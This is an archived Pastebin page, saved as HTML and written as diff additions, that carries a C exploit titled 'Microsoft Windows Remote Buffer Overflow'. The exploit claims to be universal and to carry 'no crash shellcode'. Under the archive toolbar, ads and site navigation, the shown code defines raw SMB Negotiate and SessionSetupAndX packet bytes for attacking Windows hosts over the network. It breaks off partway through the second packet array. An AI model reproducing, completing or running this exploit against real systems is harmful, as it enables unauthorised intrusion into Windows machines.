@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<!-- saved from url=(0071)http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/analytics.js.download" type="text/javascript"></script>
+<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app217.us.archive.org';v.server_ms=286;archive_analytics.send_pageview({});});</script>
+<script type="text/javascript" src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/bundle-playback.js.download" charset="utf-8"></script>
+<script type="text/javascript" src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/wombat.js.download" charset="utf-8"></script>
+<script type="text/javascript">
+  __wm.init("http://web.archive.org/web");
+  __wm.wombat("https://pastebin.com/cxn757Fw","20221009045102","http://web.archive.org/","web","/_static/",
+	      "1665291062");
+</script>
+<link rel="stylesheet" type="text/css" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/banner-styles.css">
+<link rel="stylesheet" type="text/css" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/iconochive.css">
+<!-- End Wayback Rewrite JS Include -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=0.75, maximum-scale=1.0, user-scalable=yes">
+        <script async="" src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/js"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', "G-S72LBY47R8");
+    </script>
+    
+    <title>Microsoft Windows Remote Buffer Overflow - Pastebin.com</title>
+    <link rel="shortcut icon" href="http://web.archive.org/web/20221009045102im_/https://pastebin.com/favicon.ico">
+    <meta name="description" content="Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.">
+    <meta property="og:description" content="Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.">
+            <meta property="fb:app_id" content="231493360234820">
+    <meta property="og:title" content="Microsoft Windows Remote Buffer Overflow - Pastebin.com">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw">
+    <meta property="og:image" content="http://web.archive.org/web/20221009045102im_/https://pastebin.com/i/facebook.png">
+    <meta property="og:site_name" content="Pastebin">
+    <meta name="google-site-verification" content="jkUAIOE8owUXu8UXIhRLB9oHJsWBfOgJbZzncqHoF4A">
+    <link rel="canonical" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw">
+        <meta name="csrf-param" content="_csrf-frontend">
+<meta name="csrf-token" content="_2YCijMZJ0TyaGTUzBh-LpUs4OR-f52365qS4Chl0-SgIlrSZk5tAZZRDLeTeRtm9Hmtpk0l0tuS39ezUFC4qA==">
+
+<link href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/bootstrap.min.css" rel="stylesheet">
+<link href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/bootstrap-tagsinput.css" rel="stylesheet">        
+<link href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/vendors.bundle.css" rel="stylesheet">
+<link href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/app.bundle.css" rel="stylesheet">
+    
+<!-- 0-x2xy94pJ -->
+<script type="text/javascript" src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/saved_resource" defer="" async=""></script><script> var vitag = vitag || {};</script>
+<!-- End Valueimpression Head Script -->
+<script>
+     vitag.smartBannerConfig= {
+          disablePosition:  "top right left",
+     }
+</script>
+<script type="text/javascript">
+        if (window.location.pathname === "/") {
+            vitag = vitag || {};
+            vitag.outStreamConfig = vitag.outStreamConfig || {};
+            vitag.outStreamConfig.enablePC = false;
+        }
+    </script>
+<link rel="stylesheet" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/stylesheet"><link id="nordvpn-contentScript-extension-fonts" rel="stylesheet" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/css"></head>
+<body class="night-auto " data-pr="x2xy94pJ" data-pa="" data-sar="1" data-abd="1"><!-- BEGIN WAYBACK TOOLBAR INSERT -->
+<script>__wm.rw(0);</script>
+<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;"><template shadowrootmode="closed"><div id="wm-ipp" style="position:fixed;left:0;top:0;right:0;">
+<div id="donato" style="position:relative;width:100%;">
+  <div id="donato-base">
+    <iframe id="donato-if" src="https://archive.org/includes/donate.php?as_page=1&amp;platform=wb&amp;referer=http%3A//web.archive.org/web/20221009045102/https%3A//pastebin.com/cxn757Fw" scrolling="no" frameborder="0" style="width:100%; height:100%">
+    </iframe>
+  </div>
+</div><div id="wm-ipp-inside">
+  <div id="wm-toolbar" style="position:relative;display:flex;flex-flow:row nowrap;justify-content:space-between;">
+    <div id="wm-logo" style="/*width:110px;*/padding-top:12px;">
+      <a href="http://web.archive.org/web/" title="Wayback Machine home page"><img src="http://web.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png" srcset="/_static/images/toolbar/wayback-toolbar-logo-100.png, /_static/images/toolbar/wayback-toolbar-logo-150.png 1.5x, /_static/images/toolbar/wayback-toolbar-logo-200.png 2x" alt="Wayback Machine" style="width:100px" border="0"></a>
+    </div>
+    <div class="c" style="display:flex;flex-flow:column nowrap;justify-content:space-between;flex:1;">
+      <form class="u" style="display:flex;flex-direction:row;flex-wrap:nowrap;" target="_top" method="get" action="http://web.archive.org/web/submit" name="wmtb" id="wmtb"><input type="text" name="url" id="wmtbURL" value="https://pastebin.com/cxn757Fw" onfocus="this.focus();this.select();" style="flex:1;" autocomplete="off"><input type="hidden" name="type" value="replay"><input type="hidden" name="date" value="20221009045102"><input type="submit" value="Go">
+      </form>
+      <div style="display:flex;flex-flow:row nowrap;align-items:flex-end;">
+                <div class="s" id="wm-nav-captures" style="flex:1;"><a class="t" href="http://web.archive.org/web/*/https://pastebin.com/cxn757Fw" title="See a list of every capture for this URL">1 capture</a><div class="r" title="Timespan for captures of this URL">9 Oct 2022</div></div>
+        <div class="k">
+          <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw" id="wm-graph-anchor">
+            <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
+              <canvas id="wm-sparkline-canvas" width="700" height="27" border="0"></canvas>
+            <div class="yt" style="display: none; width: 25px; height: 27px;"></div><div class="mt" style="display: none; width: 2px; height: 27px;"></div></div>
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="n">
+      <table>
+        <tbody>
+          <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
+          <tr class="m">
+            <td class="b" nowrap="nowrap">Sep</td>
+            <td class="c" id="displayMonthEl" title="You are here: 04:51:02 Oct 09, 2022">OCT</td>
+            <td class="f" nowrap="nowrap">Nov</td>
+          </tr>
+          <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
+          <tr class="d">
+            <td class="b" nowrap="nowrap"><img src="http://web.archive.org/_static/images/toolbar/wm_tb_prv_off.png" alt="Previous capture" width="14" height="16" border="0"></td>
+            <td class="c" id="displayDayEl" style="width:34px;font-size:22px;white-space:nowrap;" title="You are here: 04:51:02 Oct 09, 2022">09</td>
+            <td class="f" nowrap="nowrap"><img src="http://web.archive.org/_static/images/toolbar/wm_tb_nxt_off.png" alt="Next capture" width="14" height="16" border="0"></td>
+          </tr>
+          <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
+          <tr class="y">
+            <td class="b" nowrap="nowrap">2021</td>
+            <td class="c" id="displayYearEl" title="You are here: 04:51:02 Oct 09, 2022">2022</td>
+            <td class="f" nowrap="nowrap">2023</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="r" style="display:flex;flex-flow:column nowrap;align-items:flex-end;justify-content:space-between;">
+      <div id="wm-btns" style="text-align:right;height:23px;">
+                <span class="xxs">
+          <div id="wm-save-snapshot-success">success</div>
+          <div id="wm-save-snapshot-fail">fail</div>
+          <a id="wm-save-snapshot-open" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#" title="Share via My Web Archive" style="display: none;">
+            <span class="iconochive-web"></span>
+          </a>
+          <a href="https://archive.org/account/login.php" title="Sign In" id="wm-sign-in" style="display: inline-block;">
+            <span class="iconochive-person"></span>
+          </a>
+          <span id="wm-save-snapshot-in-progress" class="iconochive-web" style="display: none;"></span>
+        </span>
+                <a class="xxs" href="http://faq.web.archive.org/" title="Get some help using the Wayback Machine" style="top:-6px;"><span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span></a>
+        <a id="wm-tb-close" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#close" style="top:-2px;" title="Close the toolbar"><span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span></a>
+      </div>
+      <div id="wm-share" class="xxs">
+        <a href="http://web.archive.org/web/20221009045102/http://web.archive.org/screenshot/https://pastebin.com/cxn757Fw" id="wm-screenshot" title="screenshot" style="visibility: hidden;">
+          <span class="wm-icon-screen-shot"></span>
+        </a>
+        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#" id="wm-video" title="video">
+          <span class="iconochive-movies"></span>
+        </a>
+        <a id="wm-share-facebook" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#" data-url="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw" title="Share on Facebook" style="margin-right:5px;" target="_blank"><span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span></a>
+        <a id="wm-share-twitter" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#" data-url="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw" title="Share on Twitter" style="margin-right:5px;" target="_blank"><span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span></a>
+      </div>
+      <div style="padding-right:2px;text-align:right;white-space:nowrap;">
+        <a id="wm-expand" class="wm-btn wm-closed" href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw#expand" onclick="__wm.ex(event);return false;"><span id="wm-expand-icon" class="iconochive-down-solid"></span> <span class="xxs" style="font-size:80%;">About this capture</span></a>
+      </div>
+    </div>
+  </div>
+    <div id="wm-capinfo" style="border-top:1px solid #777;display:none; overflow: hidden">
+        <div id="wm-capinfo-notice" source="api"></div>
+                <div id="wm-capinfo-collected-by">
+    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center">COLLECTED BY</div>
+    <div style="padding:3px;position:relative" id="wm-collected-by-content">
+            <div style="display:inline-block;vertical-align:top;width:50%;">
+			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archiveteam);"></span>
+		Organization: <a style="color:#33f;" href="https://archive.org/details/archiveteam" target="_new"><span class="wm-title">Archive Team</span></a>
+		<div style="max-height:75px;overflow:hidden;position:relative;">
+	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
+	  <img align="right" src="http://archiveteam.org/images/e/e6/Archiveteam.jpg" width="200"> Formed in 2009, the Archive Team (not to be confused with the archive.org Archive-It Team) is a rogue archivist collective dedicated to saving copies of rapidly dying or deleted websites for the sake of history and digital heritage. The group is 100% composed of volunteers and interested parties, and has expanded into a large amount of related projects for saving online and digital history.
+<p>
+History is littered with hundreds of conflicts over the future of a community, group, location or business that were "resolved" when one of the parties stepped ahead and destroyed what was there. With the original point of contention destroyed, the debates would fall to the wayside. Archive Team believes that by duplicated condemned data, the conversation and debate can continue, as well as the richness and insight gained by keeping the materials. Our projects have ranged in size from a single volunteer downloading the data to a small-but-critical site, to over 100 volunteers stepping forward to acquire terabytes of user-created data to save for future generations.
+</p><p>
+The main site for Archive Team is at <a href="http://www.archiveteam.org/">archiveteam.org</a> and contains up to the date information on various projects, manifestos, plans and walkthroughs.
+</p><p>
+This collection contains the output of many Archive Team projects, both ongoing and completed. Thanks to the generous providing of disk space by the Internet Archive, multi-terabyte datasets can be made available, as well as in use by the <a href="http://archive.org/web/web.php">Wayback Machine</a>, providing a path back to lost websites and work. 
+</p><p>
+Our collection has grown to the point of having sub-collections for the type of data we acquire. If you are seeking to browse the contents of these collections, the Wayback Machine is the best first stop. Otherwise, you are free to dig into the stacks to see what you may find.
+</p><p>
+<b>The Archive Team Panic Downloads</b> are full pulldowns of currently extant websites, meant to serve as emergency backups for needed sites that are in danger of closing, or which will be missed dearly if suddenly lost due to hard drive crashes or server failures. 
+</p><p>
+	</p></div>
+	      </div>
+      <div style="display:inline-block;vertical-align:top;width:49%;">
+			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archiveteam_urls)"></span>
+		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/archiveteam_urls" target="_new"><span class="wm-title">Archive Team: URLs</span></a></div>
+	      </div>
+    </div>
+    </div>
+    <div id="wm-capinfo-timestamps">
+    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center" title="Timestamps for the elements of this page">TIMESTAMPS</div>
+    <div>
+      <div id="wm-capresources" style="margin:0 5px 5px 5px;max-height:250px;overflow-y:scroll !important"></div>
+      <div id="wm-capresources-loading" style="text-align:left;margin:0 20px 5px 5px;display:none"><img src="http://web.archive.org/_static/images/loading.gif" alt="loading"></div>
+    </div>
+    </div>
+  </div></div></div><link rel="stylesheet" type="text/css" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/banner-styles.css"><link rel="stylesheet" type="text/css" href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/iconochive.css"><div class="wb-autocomplete-suggestions "></div></template>
+</div><div id="wm-ipp-print">The Wayback Machine - http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw</div>
+<script type="text/javascript">//<![CDATA[
+__wm.bt(700,27,25,2,"web","https://pastebin.com/cxn757Fw","20221009045102",1996,"/_static/",["/_static/css/banner-styles.css?v=S1zqJCYt","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
+  __wm.rw(1);
+//]]></script>
+<!-- END WAYBACK TOOLBAR INSERT -->
+ 
+
+
+<div class="wrap">
+
+        
+        
+<div class="header">
+    <div class="container">
+        <div class="header__container">
+
+                        <div class="header__left">
+                <a class="header__logo" href="http://web.archive.org/web/20221009045102/https://pastebin.com/">
+                    Pastebin                </a>
+
+                <div class="header__links h_1024">
+                    
+                                        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_api">API</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools">tools</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/faq">faq</a>
+                                    </div>
+
+                <a class="header__btn" href="http://web.archive.org/web/20221009045102/https://pastebin.com/">
+                    paste                </a>
+
+                
+                <div class="header__search">
+                                    </div>
+
+            </div>
+
+                        <div class="header__right">
+
+                                    <div class="header_sign">
+                        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/login" class="btn-sign sign-in">Login</a>
+                        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/signup" class="btn-sign sign-up">Sign up</a>
+                    </div>
+                
+            </div>
+
+        </div>
+    </div>
+
+</div>
+        
+
+    <div class="container">
+        <div class="content">
+
+                        
+                        
+<!-- 0-x2xy94pJ -->
+<div style="padding-bottom:30px; padding-top:5px;width:998px;height:290px;">
+<div style="color: #999; font-size: 12px; text-align: center;">Advertisement</div>
+<div class="adsbyvli" data-ad-slot="vi_1282550010"></div><script>(vitag.Init = window.vitag.Init || []).push(function(){viAPItag.display("vi_1282550010")})</script>
+</div>
+
+                                    
+            
+            
+<link href="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/python.css" rel="stylesheet">
+
+<div class="post-view js-post-view">
+
+    <div class="error-summary js-rating-error hide"><ul><li></li></ul></div>
+
+    
+    <div class="details">
+                    <div class="share h_800">
+                <div data-url="http://web.archive.org/web/20221009045102oe_/https://pastebin.com/cxn757Fw" class="share-btn facebook js-facebook-share" title="Share on Facebook!"><span>SHARE</span></div>
+                <div data-url="http://web.archive.org/web/20221009045102oe_/https://pastebin.com/cxn757Fw" class="share-btn twitter js-twitter-share" title="Share on Twitter!"><span>TWEET</span></div>
+            </div>
+                <div class="user-icon">
+                            <img src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/318323.jpg" alt="Sleep">                    </div>
+        <div class="info-bar">
+            <div class="info-top">
+
+                
+                
+                                    <h1>Microsoft Windows Remote Buffer Overflow</h1>
+                            </div>
+            <div class="info-bottom">
+
+                                    <div class="username">
+                                                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/u/Sleep">Sleep</a>
+                                            </div>
+
+                    
+                                             <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/message/compose?to=Sleep" class="message" title="Send a private message to: Sleep"></a>
+                                    
+                <div class="date">
+                    <span title="Saturday 8th of October 2022 11:45:17 PM CDT">Oct 8th, 2022</span>
+
+                                    </div>
+
+                <div class="visits" title="Unique visits to this paste">
+                    107                </div>
+
+                                    <div class="rating js-post-rating" data-key="cxn757Fw" title="Rating">
+                        0                    </div>
+                
+                <div class="expire" title="When this paste gets automatically deleted">
+                    Never                </div>
+
+                                    <div class="comments-info" title="Comments">
+
+                        
+                                                            <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/login?return_url=%2Fcxn757Fw%23add_comment">Add comment</a>                            
+                                            </div>
+                            </div>
+        </div>
+    </div>
+
+    
+    
+                        <div class="page">
+                <div class="content__text -no-padding">
+                    <div class="notice -post-view">
+                        <b>Not a member of Pastebin yet?</b>
+                        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/signup"><b><u>Sign Up</u></b></a>,
+                        it unlocks many cool features!                    </div>
+                </div>
+            </div>
+        
+    
+    <div class="highlighted-code">
+        <div class="top-buttons">
+            <div class="left">
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/archive/python" class="btn -small h_800">Python</a> 11.75 KB
+                                    <span title="Category">
+                        | Cybersecurity                    </span>
+                
+                                        |
+    <a class="btn -small -like" href="http://web.archive.org/web/20221009045102/https://pastebin.com/login?return_url=%2Fcxn757Fw" title="Like" data-rating="1" data-key="cxn757Fw">0</a>    <a class="btn -small -dislike" href="http://web.archive.org/web/20221009045102/https://pastebin.com/login?return_url=%2Fcxn757Fw" title="Dislike" data-rating="-1" data-key="cxn757Fw">0</a>                            </div>
+
+            <div class="right">
+                
+                                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/raw/cxn757Fw" class="btn -small">raw</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/dl/cxn757Fw" class="btn -small">download</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/clone/cxn757Fw" class="btn -small h_800">clone</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/embed/cxn757Fw" class="btn -small h_800">embed</a>
+                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/print/cxn757Fw" class="btn -small h_800">print</a>
+                
+                                    <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/report/cxn757Fw" class="btn -small">report</a>
+                
+                
+                            </div>
+        </div>
+        <div class="source python" style="font-size: px; line-height: px;">
+            <ol class="python"><li class="li1"><div class="de1">/*</div></li>
+<li class="li1"><div class="de1">&nbsp;* Microsoft Windows Remote Buffer Overflow</div></li>
+<li class="li1"><div class="de1">&nbsp;* Universal Exploit + no crash shellcode</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .::<span class="br0">[</span> ClumsyLulz <span class="br0">]</span>::.</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;* -----------------------------------------</div></li>
+<li class="li1"><div class="de1">&nbsp;*</div></li>
+<li class="li1"><div class="de1">&nbsp;*/</div></li>
+<li class="li1"><div class="de1">/* <span class="co1">#define _WIN32 */</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;stdio.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;stdlib.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;string.h&gt;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="co1">#ifdef _WIN32</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;winsock2.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#pragma comment(lib, "ws2_32")</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#else</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;sys/types.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;netinet/in.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;sys/socket.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#include &lt;netdb.h&gt;</span></div></li>
+<li class="li1"><div class="de1"><span class="co1">#endif</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_Negotiate<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>85<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>72<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>53<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>FF<span class="es0">\x</span>FE"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>62<span class="es0">\x</span>00<span class="es0">\x</span>02<span class="es0">\x</span>50<span class="es0">\x</span>43<span class="es0">\x</span>20<span class="es0">\x</span>4E<span class="es0">\x</span>45<span class="es0">\x</span>54<span class="es0">\x</span>57<span class="es0">\x</span>4F"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>52<span class="es0">\x</span>4B<span class="es0">\x</span>20<span class="es0">\x</span>50<span class="es0">\x</span>52<span class="es0">\x</span>4F<span class="es0">\x</span>47<span class="es0">\x</span>52<span class="es0">\x</span>41<span class="es0">\x</span>4D<span class="es0">\x</span>20<span class="es0">\x</span>31<span class="es0">\x</span>2E<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>02"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4C<span class="es0">\x</span>41<span class="es0">\x</span>4E<span class="es0">\x</span>4D<span class="es0">\x</span>41<span class="es0">\x</span>4E<span class="es0">\x</span>31<span class="es0">\x</span>2E<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>02<span class="es0">\x</span>57<span class="es0">\x</span>69<span class="es0">\x</span>6E<span class="es0">\x</span>64<span class="es0">\x</span>6F"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>77<span class="es0">\x</span>73<span class="es0">\x</span>20<span class="es0">\x</span>66<span class="es0">\x</span>6F<span class="es0">\x</span>72<span class="es0">\x</span>20<span class="es0">\x</span>57<span class="es0">\x</span>6F<span class="es0">\x</span>72<span class="es0">\x</span>6B<span class="es0">\x</span>67<span class="es0">\x</span>72<span class="es0">\x</span>6F<span class="es0">\x</span>75<span class="es0">\x</span>70"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>73<span class="es0">\x</span>20<span class="es0">\x</span>33<span class="es0">\x</span>2E<span class="es0">\x</span>31<span class="es0">\x</span>61<span class="es0">\x</span>00<span class="es0">\x</span>02<span class="es0">\x</span>4C<span class="es0">\x</span>4D<span class="es0">\x</span>31<span class="es0">\x</span>2E<span class="es0">\x</span>32<span class="es0">\x</span>58<span class="es0">\x</span>30<span class="es0">\x</span>30"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>02<span class="es0">\x</span>4C<span class="es0">\x</span>41<span class="es0">\x</span>4E<span class="es0">\x</span>4D<span class="es0">\x</span>41<span class="es0">\x</span>4E<span class="es0">\x</span>32<span class="es0">\x</span>2E<span class="es0">\x</span>31<span class="es0">\x</span>00<span class="es0">\x</span>02<span class="es0">\x</span>4E<span class="es0">\x</span>54"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>20<span class="es0">\x</span>4C<span class="es0">\x</span>4D<span class="es0">\x</span>20<span class="es0">\x</span>30<span class="es0">\x</span>2E<span class="es0">\x</span>31<span class="es0">\x</span>32<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_SessionSetupAndX<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>A4<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>FF<span class="es0">\x</span>FE"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>0C<span class="es0">\x</span>FF<span class="es0">\x</span>00<span class="es0">\x</span>A4<span class="es0">\x</span>00<span class="es0">\x</span>04<span class="es0">\x</span>11<span class="es0">\x</span>0A<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>D4<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>80<span class="es0">\x</span>69<span class="es0">\x</span>00<span class="es0">\x</span>4E"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>54<span class="es0">\x</span>4C<span class="es0">\x</span>4D<span class="es0">\x</span>53<span class="es0">\x</span>53<span class="es0">\x</span>50<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>97<span class="es0">\x</span>82<span class="es0">\x</span>08<span class="es0">\x</span>E0<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
